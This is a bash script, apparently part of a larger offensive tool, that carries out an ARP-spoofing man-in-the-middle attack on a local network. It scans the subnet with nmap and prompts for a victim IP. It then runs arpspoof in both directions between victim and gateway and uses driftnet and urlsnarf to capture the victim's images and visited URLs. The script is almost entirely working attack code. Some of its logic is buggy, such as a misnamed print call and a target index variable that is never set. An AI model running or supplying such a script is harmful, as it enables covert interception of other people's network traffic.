#!/bin/bash

function enablePacketFowarding {
  sysctl -w net.ipv4.ip_forward=1
  printf "\n Packet Forwarding Enabled \n\n";
}

function disablePacketFowarding {
  sysctl -w net.ipv4.ip_forward=0
  print "\n Packet Forwarding Disabled \n\n";
}

function getIPAddressesInNetworkMIM {

  printf "\n\nDetecting devices in the network... \n"
  ipAddressesMIM=( $(nmap -n -sn $userIPAddress/24 -oG - | awk '/Up$/{print $2}' | xargs) )
  #getMACAddressesInNetwork
}

function printIPAddressesInNetworkMIM {

  i=1
  for ip in "${ipAddressesMIM[@]}"
  do
    deviceName=$(getDeviceName "$ip")
    echo -e " ${RED}[$i] ${WHITE}"$ip"        [ "$deviceName" ]"
    ((i++))
  done

}

function selectedTarget {

  printf "${YELLOW}Available devices: \n${WHITE}"
  printIPAddressesInNetworkMIM


  printf "\n SELECT TARGET IP> \n"
  read -r victimIPAddress

  getDefaultGateway
  trafficSelectedIp
  enablePacketFowarding
  interceptPackages
  inverseInterceptPackages
  checkImages
  snifNetwork
}



function trafficSelectedIp {
  targetIPAddress=${ipAddressesMIM[ipSelectedMIM-1]}
  #victimMACAddress=${macAddresses[ipSelectedOption-1]}
  echo -e "\n ${YELLOW}Target IP: ${RED}"$targetIPAddress${WHITE}
  echo -e " ${YELLOW}Router IP: ${RED}"$defaultGateway${WHITE}

  
  printf "\n\n"
  echo -e "${RED}         -> Press CTRL+C to STOP!${WHITE}"
  printf "\n"
}

function interceptPackages {
  printf " Intercepting pacakages\n\n"
  xterm -e arpspoof -i $defaultInterface -t $targetIPAddress -r $defaultGateway &

}

function inverseInterceptPackages {
  xterm -e arpspoof -i $defaultInterface -t $defaultGateway $targetIPAddress &
}

function checkImages {
  cmd3=("driftnet -i "$defaultInterface)

  $cmd3 &
}

function snifNetwork {
  urlsnarf -i $defaultInterface > /dev/null
}

